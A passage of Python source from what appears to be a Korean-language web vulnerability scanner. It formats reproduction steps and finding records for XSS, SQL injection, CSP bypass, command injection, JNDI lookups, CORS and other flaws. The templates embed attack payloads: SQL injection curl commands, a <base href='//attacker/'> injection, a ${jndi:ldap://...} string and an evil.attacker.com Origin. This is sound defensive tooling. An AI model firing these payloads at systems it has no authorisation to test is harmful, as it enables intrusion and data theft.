                _steps.append(f"   · {_e.get('method','GET')} {_e.get('url','')} → {', '.join(_e.get('sensitive_fields', [])[:6])}")
        _biz = data.get("business_logic_candidates") or []
        if _biz:
            _steps.append(f"[안티패턴 후보] {len(_biz)}건 — 각 항목 SAFE 테스트 레시피 포함:")
            for _c in _biz[:15]:
                _p = ("(" + ", ".join(_c.get("params", [])) + ")") if _c.get("params") else ""
                _steps.append(f"   · [{_c.get('pattern')}] {_c.get('method')} {_c.get('path')}{_p} — {_c.get('category')}")
                _steps.append(f"     검증법: {_c.get('safe_test','')}")
        _steps.append("[결론] 후보는 결정적 생성(요청 미전송) — SAFE 실행기/수동 검증으로 확증 필요")
        return _steps

    if probe_key in ("xss_js_context", "xss_attr_context"):
        alert_msg = data.get("alert_message", "")
        _verif = data.get("verification", "static_breakout")
        _method = (data.get("method") or "GET").upper()
        _ctx = data.get("context", "")
        _is_js = probe_key == "xss_js_context"
        _ctx_name = f"인라인 <script> JS {_ctx} 컨텍스트" if _is_js else "따옴표 HTML 속성값 컨텍스트"
        _escape = "따옴표/스크립트 종료로 문자열 컨텍스트 탈출" if _is_js else "구분 따옴표 미인코딩으로 속성값 탈출"
        _sep = "&" if "?" in url else "?"
        _get_url = f"{url}{_sep}{param}={urllib.parse.quote(payload, safe='')}"
        if _verif == "playwright":
            _last = f"[4단계] Playwright 헤드리스 브라우저에서 alert() 실제 발생 확인 — 메시지: \"{alert_msg}\""
            _concl = "브라우저에서 스크립트 실제 실행 확인 → XSS 실증 완료"
        else:
            _last = ("[4단계] 페이로드의 구분 따옴표가 인코딩 없이 '원문 그대로 반사'됨을 정적 확인 "
                     "→ 기존 태그의 속성값을 탈출해 이벤트 핸들러를 주입할 수 있음(브라우저에서 실행됨). "
                     "HTML 태그 페이로드(<script>)로는 못 잡는 컨텍스트라 정적 반사로 확증.")
            _concl = "구분 따옴표 미인코딩 원문 반사 확인 → 브라우저에서 결정적 실행 가능(XSS 실증)"
        _repro = (f"        브라우저로 재현: 아래 URL 을 웹브라우저에서 열고, "
                  f"{'마우스를 페이지 위로 움직이면' if 'onmouse' in payload.lower() else '입력 요소에 포커스가 가면'} "
                  f"alert 발생(curl 은 실행 불가):\n        {_get_url}"
                  if _method == "GET" else
                  f"        브라우저로 재현: '{param}' 에 아래 원문 페이로드를 넣어 POST 제출 후 상호작용 시 alert 발생")
        return [
            f"[개요] 파라미터 '{param}' 값이 {_ctx_name} 안으로 반사되며, {_escape} 하여 "
            f"이벤트 핸들러(onmousemove/onfocus 등)를 주입해 스크립트를 실행할 수 있습니다.",
            f"[1단계] 대상({_method}): {url}",
            f"[2단계] '{param}' 값이 {_ctx_name}로 반사됨을 벤치마크로 확인",
            f"[3단계] 아래 페이로드 삽입(원문 전체 — 절단 없음):",
            f"        페이로드(원문) ▶ {payload}",
            _repro,
            _last,
            f"[결론] {_concl}. "
            f"※ URL 은 전송용 퍼센트 인코딩이며, 위 '원문 페이로드'가 실제 삽입값입니다.",
        ]

    if probe_key == "csp_bypass":
        ws = data.get("weaknesses") or []
        top = ws[0]["id"] if ws else "base_uri_script_hijack"
        rp = data.get("reflection_param", "param")
        return [
            f"[1단계] 대상 페이지 CSP 헤더 분석: {url}",
            f"        약점: {', '.join(w['id'] for w in ws) or top}",
            f"[2단계] raw 반사 주입점 확인 — 파라미터 '{rp}' 에 <base> 삽입 위치가 "
            f"nonce 스크립트보다 앞",
            f"        주입 페이로드: {data.get('base_payload', '<base href=\"//attacker/\">')}",
            f"[3단계] 로컬 리스너 기동 후 재현 URL 접속: {data.get('target_url', url)}",
            f"        하이재킹된 로드 경로: {', '.join(data.get('hijacked_paths') or [])}",
            f"[4단계] 헤드리스 브라우저(CSP 강제)에서 하이재킹된 nonce 스크립트 실제 실행 확인",
            f"[결론]  CSP 가 있어도 base-uri 미설정으로 XSS 실행 우회 성립 → 취약점 실증 완료",
        ]

    if probe_key == "xss_stored":
        alert_msg = data.get("alert_message", "")
        return [
            f"[1단계] POST 폼 발견: {data.get('submit_url', url)}",
            f"[2단계] 파라미터 '{param}'에 XSS 페이로드 포함하여 폼 제출",
            f"        삽입 페이로드(원문): {payload}",
            f"[3단계] 저장 완료 후 결과 페이지 재방문: {data.get('verify_url', url)}",
            f"[4단계] Playwright 브라우저에서 저장된 스크립트 실행으로 alert 발생",
            f"        alert 메시지: \"{alert_msg}\"",
            f"[결론]  페이지 방문자 전원에게 XSS 실행됨 → 저장형 XSS 취약점 실증 완료",
        ]

    if probe_key == "sql_injection":
        sqli_type = data.get("type", "")
        method = data.get("method", "GET")

        def _curl_cmd(target_url, p, pl):
            enc = urllib.parse.quote(pl, safe="")
            if method == "POST":
                return f'curl -s -X POST "{target_url}" -d "{p}={enc}"'
            sep = "&" if "?" in target_url else "?"
            return f'curl -s "{target_url}{sep}{p}={enc}"'

        if sqli_type == "error_based":
            snippet = data.get("error_snippet", "")
            ext = data.get("extracted_data") or {}
            _sq = chr(39)  # '
            steps = [
                f"[개요] 파라미터 '{param}'의 입력값이 SQL 쿼리에 직접 삽입됩니다. 아래는 담당자가",
                f"       그대로 재현할 수 있는 단계입니다(비파괴·읽기전용). {method} 요청.",
                f"[1단계] 정상 요청(주입 없음) — 기준 확인:",
                f"        {_curl_cmd(url, param, '1')}",
                f"        예상: 정상 결과 1건 반환(예: First name 1개).",
                f"[2단계] 주입점 확인 — 홑따옴표(') 하나로 SQL 구문 파괴:",
                f"        {_curl_cmd(url, param, _sq)}",
                f"        예상: DB 문법 오류가 응답에 노출됨(입력이 쿼리에 들어간다는 증거).",
                f"        실제 관측된 오류: {snippet[:600]}",
            ]
            if ext.get("extracted"):
                _proof = data.get("repro_url") or _curl_cmd(url, param, "1' UNION SELECT ...")
                steps += [
                    f"[3단계] ★실증(데이터 추출) — UNION SELECT 로 서버 내부 정보를 실제로 읽어냄:",
                    f"        curl -s \"{_proof}\"",
                    f"        예상 응답: 정상 데이터 대신 아래 값이 페이지에 '그대로 표시'됨 —",
                    f"          · DB 버전     = {ext.get('db_version','')}",
                    f"          · 현재 DB 사용자 = {ext.get('db_user','')}",
                    f"          · 데이터베이스명 = {ext.get('db_name','')}",
                    f"[해석] 서버 내부 정보가 응답에 노출됨 → 공격자가 임의 DB 데이터를 조회 가능.",
                    f"[결론] 입력이 SQL 쿼리를 조작함이 '실제 데이터 추출'로 확정됨 → SQL 인젝션 실증.",
                ]
            else:
                steps += [
                    f"[3단계] ★실증(인증/조건 우회) — 항상 참 조건으로 WHERE 를 무력화:",
                    f"        {_curl_cmd(url, param, chr(39)+' OR '+chr(39)+'1'+chr(39)+'='+chr(39)+'1')}",
                    f"        예상: 한 건이 아니라 '전체 레코드(예: 사용자 전원)'가 반환됨.",
                    f"        비교: 1단계(정상)는 1건, 이 요청은 다수 반환 → WHERE 조건 우회 확인.",
                    f"[결론] 입력으로 SQL 조건을 조작 가능(전체 레코드 반환) → SQL 인젝션 실증.",
                ]
            return steps

        if sqli_type == "union_based":
            ver = data.get("extracted_version", "")
            return [
                f"[1단계] 대상 URL 파라미터 '{param}' 식별",
                f"        URL: {url}",
                f"[2단계] UNION SELECT 페이로드로 DB 내부 데이터 추출",
                f"        페이로드(원문): {payload}",
                f"        재현 명령: {_curl_cmd(url, param, payload)}",
                f"[3단계] 응답 HTML에서 DB 버전 문자열 추출 성공:",
                f"        >>> {ver}",
                f"[결론] 위 버전 문자열이 HTTP 응답에 출력됨 → UNION SELECT 기반 SQL 인젝션 실증 완료",
            ]

        def _blind_extract_steps():
            """블라인드 데이터 추출 실증(있으면) — 실제로 값을 읽어냈음을 단계로 제시."""
            ex = data.get("extracted_data") or {}
            if not (isinstance(ex, dict) and ex.get("technique") == "boolean_blind"):
                return []
            return [
                f"[★실증] 데이터가 직접 안 보이는 블라인드에서도 '참/거짓 응답'을 신호로 값을 문자단위로 읽어냄:",
                f"        DBMS={ex.get('dbms','')} · {ex.get('value_name','')} = \"{ex.get('db_name','')}\" "
                f"(총 {ex.get('requests','')}회 질의, 읽기전용·비파괴)",
                f"        추출 원리: {ex.get('proof_payload','')}  (N=글자위치, X=이진탐색 코드값)",
                f"[해석] 실제 DB 값을 추출 → 블라인드이지만 임의 데이터 조회 가능이 '증명'됨.",
            ]

        if sqli_type == "boolean_based":
            return [
                f"[개요] 데이터가 화면에 안 나오지만, 참/거짓 조건에 따라 응답이 달라지는 '블라인드' SQLi.",
                f"[1단계] 대상 파라미터 '{param}': {url}",
                f"[2단계] 참 조건 요청: {_curl_cmd(url, param, data.get('true_payload', ''))}",
                f"[3단계] 거짓 조건 요청: {_curl_cmd(url, param, data.get('false_payload', ''))}",
                f"[4단계] 두 응답이 다름(크기차 {data.get('response_diff_bytes', 0)}바이트/내용 상이) → 조건이 서버서 해석됨",
            ] + _blind_extract_steps() + [
                f"[결론] 참/거짓으로 응답이 갈림 + 실제 값 추출 → 불린 블라인드 SQL 인젝션 실증.",
            ]

        if sqli_type == "time_based":
            return [
                f"[개요] 화면 변화가 없어도, 조건 참일 때만 서버가 지연(SLEEP)되는 '시간 기반 블라인드' SQLi.",
                f"[1단계] 대상 파라미터 '{param}': {url}",
                f"[2단계] {data.get('db_type', 'DB')} SLEEP 페이로드 삽입:",
                f"        재현 명령: {_curl_cmd(url, param, payload)}",
                f"[3단계] 응답 시간 {data.get('elapsed_sec', 0)}초 지연 확인(정상은 즉시) → 조건이 서버서 실행됨",
            ] + _blind_extract_steps() + [
                f"[결론] 지연 발생 + 실제 값 추출 → 시간 기반 블라인드 SQL 인젝션 실증.",
            ]

    if probe_key == "idor_candidate":
        cands = data.get("candidates", []) or []
        steps = [f"[1단계] 객체 참조 추정 파라미터 {data.get('count', len(cands))}건 수집 (자동 공격 미수행)"]
        for c in cands[:10]:
            steps.append(f"  - {c.get('method','GET')} {c.get('url','')} : '{c.get('param','')}'"
                         f"{' (숫자형)' if c.get('numeric') else ''}")
        steps.append("[수동 검토] 인증 세션에서 식별자 값을 타 사용자 값으로 치환해 권한 검증 여부 확인")
        return steps

    if probe_key == "csrf_candidate":
        cands = data.get("candidates", []) or []
        weak = data.get("weak_samesite_cookies", []) or []
        steps = []
        if cands:
            steps.append(f"[1단계] CSRF 토큰 없는 상태변경 요청 {len(cands)}건 식별 (요청 미전송)")
            for c in cands[:10]:
                steps.append(f"  - {c.get('method','POST')} {c.get('url','')}")
        if weak:
            steps.append(f"[2단계] SameSite 미흡 쿠키 {len(weak)}건: "
                         + ", ".join(f"{w.get('name')}({w.get('samesite')})" for w in weak[:8]))
        steps.append("[수동 검토] Origin/Referer 검증 및 토큰 검증 여부를 수동 확인")
        return steps

    if probe_key == "business_logic_candidate":
        cands = data.get("candidates", []) or []
        steps = [f"[1단계] 비즈니스 로직 민감 파라미터 {data.get('count', len(cands))}건 수집(조작 미수행)"]
        for c in cands[:12]:
            steps.append(f"  - {c.get('method','GET')} {c.get('url','')} : '{c.get('param','')}'"
                         f"{(' = ' + c.get('sample_value')) if c.get('sample_value') else ''}")
        steps.append("[수동 검토] 값 변조(가격↓/권한↑/포인트↑) 시 서버측 재검증 여부 확인")
        return steps

    if probe_key == "file_upload_candidate":
        cands = data.get("candidates", []) or []
        steps = [f"[1단계] 파일 업로드 폼 {data.get('count', len(cands))}건 발견(업로드 미수행)"]
        for c in cands[:8]:
            acc = ", ".join(c.get("accept_attr") or []) or "없음"
            steps.append(f"  - {c.get('method','POST')} {c.get('url','')} "
                         f"(multipart={c.get('multipart')}, accept={acc}, "
                         f"제한={c.get('extension_restriction')})")
        steps.append("[수동 검토] 서버측 확장자/MIME/매직바이트 검증 및 업로드 경로 실행권한 확인")
        return steps

    if probe_key == "csrf":
        csrf_type = data.get("type", "")
        if csrf_type == "no_csrf_token":
            return [
                f"POST {url} 폼에 CSRF 토큰 필드 없음 확인",
                "CSRF 토큰 없이 직접 POST 요청 전송",
                f"HTTP {data.get('response_status', '')} 응답 — 서버가 요청 수락",
            ]
        return [
            f"POST {url} 폼의 CSRF 토큰 필드 확인: {data.get('csrf_fields_found', [])}",
            "CSRF 토큰 제거 후 POST 요청 전송",
            f"HTTP {data.get('response_status', '')} 응답 — 서버가 토큰 없이 수락",
        ]

    if probe_key == "lfi":
        return [
            f"파라미터 '{param}'에 경로 순회 페이로드 삽입: {payload}",
            f"대상 URL: {url}",
            f"OS: {data.get('os_type', '')}",
            f"파일 내용 노출 확인:\n{data.get('file_content_preview', '')[:800]}",
        ]

    if probe_key == "cmd_injection":
        _CMDI_TOKEN = "CMDTEST_XK9Q2M7"
        cmd_type = data.get("type", "")
        if cmd_type == "output_based":
            snippet = data.get("echo_snippet", "")
            encoded_payload = urllib.parse.quote(payload)
            steps = [
                f"[1단계] 대상 URL 접속 및 파라미터 '{param}' 식별",
                f"        URL: {url}",
                f"[2단계] 파라미터 '{param}'에 명령어 인젝션 페이로드 삽입",
                f"        페이로드: {payload}",
                f"        재현 명령: curl -s \"{url}?{param}={encoded_payload}\"",
            ]
            if snippet:
                steps.append(f"[3단계] HTTP 응답에서 에코 토큰 확인:\n        {snippet[:400]}")
                steps.append(f"[결론]  에코 토큰({_CMDI_TOKEN})이 응답에 나타남 → 서버에서 OS 명령어 실행 확인")
            else:
                steps.append(f"[3단계] 에코 토큰({_CMDI_TOKEN})이 HTTP 응답에서 확인됨")
            return steps
        return [
            f"[1단계] 파라미터 '{param}'에 시간 지연 페이로드 삽입: {payload}",
            f"[2단계] 응답 지연 {data.get('elapsed_sec', 0)}초 확인 (베이스라인 대비 지연 발생)",
            f"[결론]  SLEEP/sleep 명령어가 서버에서 실행됨 → OS 명령어 인젝션 확인",
        ]

    if probe_key == "ssti":
        _steps = [
            f"파라미터 '{param}'에 템플릿 표현식 삽입: {payload}",
            f"엔진: {data.get('engine', '')}",
            f"응답에서 수식 평가 결과 확인: {data.get('expected_result', '')}",
        ]
        if data.get("rce_confirmed"):
            _tok = str(data.get("rce_token", ""))[:8]
            _steps.append(
                f"[RCE 실증] 엔진 네이티브 OOB 페이로드 삽입: {data.get('rce_payload', '')}"
            )
            _steps.append(
                f"[RCE 실증] 서버가 스캐너 OOB 리스너로 콜백(토큰 {_tok}…) → 코드 실행 도달성 확증"
                " (셸/데이터 추출 없음)"
            )
        return _steps

    if probe_key == "jndi":
        _where = "HTTP 헤더" if data.get("vector") == "header" else "파라미터"
        return [
            f"{_where}에 JNDI 룩업 페이로드 주입: ${{jndi:ldap://<스캐너>/...}}",
            "서버(JVM)가 스캐너 raw-TCP 캐처로 LDAP 연결 시도(포트=토큰으로 정확 상관)",
            "콜백 수신 → 원격 클래스 로딩 경로 확증(Log4Shell 계열 RCE, 셸/데이터 추출 없음)",
        ]

    if probe_key == "file_upload":
        _steps = [
            f"업로드 폼에 위험 확장자 파일 전송(Content-Type 위조): {data.get('uploaded_url', '')}",
        ]
        if data.get("code_execution"):
            _steps.append(f"엔진: {data.get('engine', '')}")
            _steps.append(
                "[RCE 실증] 업로드 파일을 되받아 실행 결과(6*7=42) 반환 확인, 원문 소스 미노출 "
                "→ 정적 서빙과 차등으로 서버측 코드 실행 확정"
            )
        else:
            _steps.append("파일 타입 제한 없음 — 위험 확장자 업로드 허용(실행 확증은 미완)")
        return _steps

    if probe_key == "open_redirect":
        return [
            data.get("evidence", f"파라미터 '{param}'에 외부 URL 삽입")[:100],
            f"Location 헤더 확인: {data.get('redirect_to', '')}",
        ]

    if probe_key == "cors":
        cors_level = data.get("cors_level", "")
        cors_type = data.get("type", "")
        steps = [
            f"[1단계] Origin: {data.get('tested_origin', 'evil.attacker.com')} 헤더로 요청 전송",
            f"[2단계] Access-Control-Allow-Origin: {data.get('allow_origin', '')} 응답 확인",
            f"        Access-Control-Allow-Credentials: {data.get('allow_credentials', '') or '(없음)'}",
        ]
        if cors_type == "wildcard":
            steps.append("[판정] INFO — 와일드카드 설정. 공개 리소스는 의도적일 수 있으나 인증 API 적용 시 취약")
        elif cors_level == "LOW":
            steps.append("[판정] LOW — Origin 반사 확인. 자격증명 없어 쿠키 미포함 데이터만 노출 가능")
        elif cors_level == "MEDIUM":
            steps.append("[판정] MEDIUM — Origin 반사 + Allow-Credentials: true. 세션 쿠키 포함 요청 가능")
        elif cors_level == "HIGH":
            api_url = data.get("auth_api_url", "")
            steps.append(f"[판정] HIGH — 인증 API({api_url})에서도 반사 확인. 실제 세션 탈취 가능")
        return steps

    if probe_key == "auth_bypass":
        return [
            f"GET {url} 기본 요청 → HTTP {data.get('original_status', '')}",
            f"'{data.get('bypass_header', '')}': 127.0.0.1 헤더 추가 후 재요청",
            f"HTTP {data.get('bypassed_status', '')} 응답 — 접근 제어 우회 확인",
        ]

    if probe_key == "sqli_auth_bypass":
        desc = data.get("description", "SQL 조건 우회")
        encoded = urllib.parse.quote(payload)
        steps = [
            f"[1단계] 로그인 폼 발견: {url}",
            f"[2단계] 파라미터 '{param}'에 SQL 인젝션 페이로드 삽입 ({desc})",
            f"        페이로드: {payload}",
            f"        재현 명령: curl -s -X POST \"{url}\" -d \"{param}={encoded}\"",
        ]
        if data.get("redirect_to"):
            steps.append(f"[3단계] HTTP 302 리다이렉트 응답 → {data.get('redirect_to')}")
            steps.append(f"[결론]  패스워드 없이 로그인 성공 — SQL 인젝션 인증 우회 실증 완료")
        else:
            steps.append(f"[3단계] HTTP {data.get('response_status', 200)} 응답 — 로그인 성공 키워드 확인")
            steps.append(f"[결론]  패스워드 없이 로그인 성공 — SQL 인젝션 인증 우회 실증 완료")
        return steps

    if probe_key == "vim_swp":
        swp_url = data.get("url", url)
        return [
            f"[1단계] Vim 스왑 파일 경로 탐색: {swp_url}",
            f"[2단계] HTTP 200 응답 + 'b0VIM' 매직 바이트 확인",
            f"        재현 명령: curl -s \"{swp_url}\" | head -c 20",
            f"[3단계] vim -r 명령으로 소스코드 복구 가능",
            f"[결론]  Vim 스왑 파일이 웹에서 직접 다운로드 가능 → 서버 소스코드 노출",
        ]

    if probe_key == "email_header_injection":
        return [
            f"[1단계] 이메일 파라미터 '{param}' 식별: {url}",
            f"[2단계] CRLF 문자 포함 페이로드 삽입",
            f"        페이로드: {repr(payload)}",
            f"[3단계] 응답 헤더에 임의 헤더 삽입 확인",
            f"[결론]  이메일 헤더 조작 가능 → 스팸 발송 릴레이, BCC 추가 가능",
        ]

    # Phase 2 탐지 단계
    if probe_key == "clickjacking":
        return [
            f"[1단계] GET {url} 요청 — X-Frame-Options 및 CSP frame-ancestors 헤더 부재 확인",
            f"        X-Frame-Options: {data.get('xfo_header', '(없음)')}",
            f"        CSP frame-ancestors: {'설정됨' if data.get('csp_fa') else '(없음)'}",
            f"[2단계] Playwright 헤드리스 브라우저로 iframe PoC 페이지 렌더링",
            f"[3단계] iframe 내부에 대상 페이지 실제 로드 확인 (content_frame 접근 가능)",
            f"[결론]  대상 사이트가 다른 도메인의 iframe에 삽입됨 → Clickjacking 실증 완료",
            f"        재현: {''.join(data.get('evidence_screenshots', [])[:1])} 스크린샷 참조",
        ]

    if probe_key == "swagger_openapi":
        endpoint_hint = data.get("endpoint_hint", "")
        return [
            f"[1단계] Swagger/OpenAPI 경로 목록 순차 탐색",
            f"[2단계] GET {url} → HTTP {data.get('status_code', 200)} 응답",
            f"        Content-Type: {data.get('content_type', '')}",
            f"[3단계] 응답에서 swagger/openapi/paths 키워드 확인",
            f"[결론]  API 문서가 인증 없이 공개됨{endpoint_hint}",
            f"        재현: curl -s \"{url}\" | python -m json.tool",
        ]

    if probe_key == "graphql_introspection":
        types = data.get("exposed_types", [])
        return [
            f"[1단계] GraphQL 엔드포인트 탐색: {url}",
            f'[2단계] POST {url} -d \'{{"query":"{{ __schema {{ types {{ name }} }} }}"}}\' 전송',
            f"[3단계] 응답에서 \"__schema\" 키 확인 → Introspection 활성화",
            f"        노출 타입 (상위 5개): {', '.join(types[:5]) if types else '확인됨'}",
            f"[결론]  GraphQL 전체 스키마 열람 가능 → 내부 API 구조 노출",
        ]

    if probe_key == "spring_actuator":
        paths = data.get("accessible_paths", [])
        sensitive = data.get("sensitive_hits", [])
        steps = [
            f"[1단계] Spring Actuator 엔드포인트 목록 탐색",
            f"[2단계] 접근 가능 엔드포인트 ({len(paths)}개): {', '.join(paths[:5])}",
        ]
        if sensitive:
            keywords = list({h["keyword"] for h in sensitive})[:3]
            steps.append(f"[3단계] 민감정보 키워드 발견: {', '.join(keywords)}")
            steps.append(f"        스니펫: {sensitive[0].get('snippet', '')[:120]}")
        steps.append(f"[결론]  Spring Actuator 무인증 노출 → 민감정보 탈취 가능")
        steps.append(f"        재현: curl -s \"{url}\" | python -m json.tool")
        return steps

    if probe_key == "source_map":
        src_files = data.get("source_files", [])
        return [
            f"[1단계] JS 파일 분석: {data.get('js_url', url)}",
            f"[2단계] sourceMappingURL 또는 X-SourceMap 헤더에서 .map 파일 경로 추출",
            f"[3단계] GET {url} → HTTP 200, \"sources\" 키 확인",
            f"        노출 소스 파일: {', '.join(src_files[:3]) if src_files else '확인됨'}",
            f"[결론]  Source Map으로 원본 소스코드 역컴파일 가능",
            f"        재현: curl -s \"{url}\" | python -c \"import sys,json; d=json.load(sys.stdin); print('\\n'.join(d.get('sources',[])))\"",
        ]

    if probe_key == "backup_file":
        return [
            f"[1단계] 백업 파일 경로 목록 탐색: {data.get('path', '')}",
            f"[2단계] GET {url} → HTTP {data.get('status_code', 200)}, {0}바이트 응답",
            f"[3단계] 응답 내용 확인" + (" — 민감정보 키워드 발견" if data.get("confirmed") else ""),
            f"        미리보기: {data.get('preview', '')[:600]}",
            f"[결론]  백업 파일 직접 다운로드 가능 → 소스코드·자격증명 노출",
            f"        재현: curl -s -o backup_file \"{url}\"",
        ]

    if probe_key == "js_secrets":
        findings = data.get("findings", [])
        steps = [f"[1단계] 페이지 소스 및 JS 파일 내 민감정보 패턴 탐색: {url}"]
        for i, f in enumerate(findings[:3], 2):
            label = f.get("label", f.get("type", ""))
            src = f.get("source", url)
            preview = f.get("preview", f.get("snippet", ""))[:40]
            steps.append(f"[{i}단계] {label} 발견 — {src}: ...{preview}...")
        steps.append(f"[결론]  {len(findings)}건 민감정보 발견 → 자격증명 탈취 가능")
        return steps

    # Phase 6 신규 탐지 단계
    if probe_key == "admin_panel":
        found = data.get("found_pages", [])
        steps = [
            f"[1단계] 관리자 페이지 경로 목록 탐색 시작",
        ]
        for p in found[:3]:
            steps.append(
                f"[발견] {p['url']} → HTTP {p['status_code']}"
                f"{', 로그인 폼 있음' if p.get('has_login_form') else ''}"
            )
        steps.append(f"[결론]  관리자 페이지 {len(found)}개 인터넷 노출 확인 — 접근 제어 강화 필요")
        return steps

    if probe_key == "admin_api":
        found = data.get("found_endpoints", [])
        steps = [f"[1단계] 관리자/내부 API 경로 탐색"]
        for ep in found[:3]:
            steps.append(
                f"[발견] GET {ep['url']} → HTTP {ep['status_code']}"
                f"{', JSON 응답' if ep.get('is_json') else ''}"
            )
        steps.append(f"[결론]  인증 없이 {len(found)}개 내부 API 접근 가능 — 민감 데이터 열람 위험")
        return steps

    if probe_key == "framework_info":
        detected = data.get("detected_frameworks", [])
        steps = [f"[1단계] 페이지 HTML/JS에서 프레임워크 패턴 분석: {url}"]
        for d in detected[:5]:
            steps.append(f"[발견] {d['framework']}: {d['marker']} — {d.get('evidence_snippet', '')[:60]}")
        return steps

    if probe_key == "user_enumeration":
        diff = data.get("difference", "")
        diff_label = {"status_code": "HTTP 상태코드 차이", "error_message": "오류 메시지 차이",
                      "response_length": "응답 길이 차이"}.get(diff, diff)
        return [
            f"[1단계] 로그인 폼 발견: {data.get('url', url)}",
            f"[2단계] 존재하지 않는 계정으로 POST 요청",
            f"[3단계] 일반 계정(비밀번호 오류)으로 POST 요청",
            f"[4단계] 응답 비교 — {diff_label} 확인",
            f"[결론]  계정 존재 여부 판별 가능 → 크리덴셜 스터핑에 활용 가능",
        ]

    # 기본 단계
    return [
        f"대상 URL: {url}",
        f"점검 방법: {probe_key}",
        data.get("evidence", "취약점 확인됨"),
    ]


# ── Finding / result builders ─────────────────────────────────────────────────

def _passive_confidence(check_type: str, evidence: dict) -> str:
    """패시브 룰 취약점의 confidence 레벨을 결정합니다."""
    if check_type in ("directory_indexing", "error_page_leakage", "server_version", "dangerous_methods"):
        return "CONFIRMED"
    if check_type == "sensitive_path":
        detail = evidence.get("evidence_detail", "")
        return "CONFIRMED" if "파일 내용 직접 노출" in detail else "POSSIBLE"
    if check_type == "http_plaintext":
        # 세션 쿠키가 평문 HTTP 로 전송됨을 실제 관측 → 추정이 아닌 사실 → CONFIRMED.
        # (로그인 폼만 있는 경우는 제출 시 노출이라 POSSIBLE 유지)
        if "세션 쿠키" in (evidence.get("evidence_detail", "") or ""):
            return "CONFIRMED"
        return "POSSIBLE"
    return "POSSIBLE"


def _make_reproduction_cmd(evidence_url: str, method: str = "GET", body: str = "") -> str:
    if not evidence_url:
        return ""
    if method == "POST" and body:
        return f'curl -s -X POST "{evidence_url}" -d "{body}"'
    return f'curl -s -i "{evidence_url}"'


def _build_finding(rule: dict, host: str, port: int, service_name: str,
                   evidence: dict,
                   is_new: bool = True, is_persistent: bool = False) -> dict:
    check_type = rule.get("check_type", "")
    evidence_url = evidence.get("evidence_url", "")
    confidence = _passive_confidence(check_type, evidence)
    return {
        "host": host,
        "port": port,
        "service": service_name,
        "judgment": "취약",
        "severity": rule.get("severity", "MEDIUM"),
        "confidence": confidence,
        "cvss_estimate": rule.get("cvss_estimate"),
        "exploitation_difficulty": rule.get("exploitation_difficulty"),
        "owasp": _OWASP_MAPPING.get(check_type, ""),
        "cwe": rule.get("cwe", ""),
        "is_new": is_new,
        "is_persistent": is_persistent,
        "is_resolved": False,
        "title": rule.get("title", ""),
        "description": (rule.get("description") or "").strip(),
        "attack_vector": (rule.get("attack_vector") or "").strip(),
        "attack_scenario": (rule.get("attack_scenario") or "").strip(),
        "tools": rule.get("tools", []),
        "cve_references": rule.get("cve_references", []),
        "lab_guide": (rule.get("lab_guide") or "").strip(),
        "recommendation": (rule.get("recommendation") or "").strip(),
        # Evidence fields
        "evidence_url": evidence_url,
        "detection_steps": evidence.get("detection_steps", []),
        "evidence_detail": evidence.get("evidence_detail", ""),
        "evidence_screenshot": "",
        "reproduction_cmd": _make_reproduction_cmd(evidence_url),
        "affected_endpoints": [evidence_url] if evidence_url else [],
        "cleanup_status": None,
    }


def _compute_overall_risk(findings: list[dict]) -> str:
    severities = {f["severity"] for f in findings if f.get("judgment") == "취약"}
    if "HIGH" in severities:
        return "HIGH"
    if "MEDIUM" in severities:
        return "MEDIUM"
    if "LOW" in severities:
        return "LOW"
    return "GOOD"


def _build_attack_chain(findings: list[dict]) -> dict:
    vuln = [f for f in findings if f.get("judgment") == "취약"]
    high = [f for f in vuln if f.get("severity") == "HIGH"]
    medium = [f for f in vuln if f.get("severity") == "MEDIUM"]

    if vuln:
        recon = "발견된 취약점: " + ", ".join(f["title"] for f in vuln[:5])
    else:
        recon = "외부 노출 고위험 취약점 미발견"

    if high:
        av = (high[0].get("attack_vector") or "").strip()[:120]
        penetration = f"초기 침투 경로: {high[0]['title']} — {av}"
    elif medium:
        av = (medium[0].get("attack_vector") or "").strip()[:120]
        penetration = f"제한적 침투 가능: {medium[0]['title']} — {av}"
    else:
        penetration = "현재 식별된 초기 침투 경로 없음"

    if len(vuln) >= 2:
        chain = " → ".join(f["title"] for f in vuln[:3])
        lateral_movement = f"{len(vuln)}개 취약점 복합 활용 시 공격 체인 구성 가능. 경로: {chain}"
    elif len(vuln) == 1:
        lateral_movement = f"단일 취약점. 내부 이동 체인 구성 제한적: {vuln[0]['title']}"
    else:
        lateral_movement = "현재 식별된 취약점으로 공격 체인 구성 불가"

    return {"recon": recon, "penetration": penetration, "lateral_movement": lateral_movement}


# ── 포트 레벨 취약점 Finding 빌더 ──────────────────────────────────────────────

_PORT_SEVERITY = {
    23:    "HIGH",    # Telnet
    21:    "HIGH",    # FTP
    6379:  "HIGH",    # Redis
    2375:  "HIGH",    # Docker API
    9200:  "HIGH",    # Elasticsearch
    27017: "HIGH",    # MongoDB
    11211: "HIGH",    # Memcached
    2181:  "MEDIUM",  # ZooKeeper
    3389:  "HIGH",    # RDP
    5900:  "HIGH",    # VNC
    445:   "HIGH",    # SMB
    3306:  "MEDIUM",  # MySQL
    5432:  "MEDIUM",  # PostgreSQL
    1433:  "MEDIUM",  # MSSQL
}

_PORT_CATEGORY = {
    23: "네트워크 서비스 취약점 (Telnet)",
    21: "네트워크 서비스 취약점 (FTP)",
    6379: "인증 미적용 서비스 (Redis)",
    2375: "컨테이너 인프라 노출 (Docker API)",
    9200: "인증 미적용 서비스 (Elasticsearch)",
    27017: "인증 미적용 서비스 (MongoDB)",
    11211: "인증 미적용 서비스 (Memcached)",
    2181: "인증 미적용 서비스 (ZooKeeper)",
    3389: "원격 접근 서비스 노출 (RDP)",
    5900: "원격 접근 서비스 노출 (VNC)",
    445: "네트워크 파일 서비스 노출 (SMB)",
    3306: "데이터베이스 직접 노출 (MySQL)",
    5432: "데이터베이스 직접 노출 (PostgreSQL)",
    1433: "데이터베이스 직접 노출 (MSSQL)",
}


def _build_port_vuln_finding(
    host: str, port: int, service_name: str,
    port_vuln: dict, prev_titles: set,
) -> dict | None:
    reason = port_vuln.get("reason", "")
    evidence = port_vuln.get("evidence", "")
    recommendation = port_vuln.get("recommendation", "")
    title = f"{service_name} 서비스 취약점 — {reason[:50]}"
    severity = _PORT_SEVERITY.get(port, "MEDIUM")
    category = _PORT_CATEGORY.get(port, f"포트 취약점 ({service_name})")
    is_persistent = stable_title(title) in prev_titles

    tcp_url = f"tcp://{host}:{port}"
    return {
        "host": host,
        "port": port,
        "service": service_name,
        "judgment": "취약",
        "severity": severity,
        "confidence": "CONFIRMED",
        "cvss_estimate": "8.0" if severity == "HIGH" else "5.3",
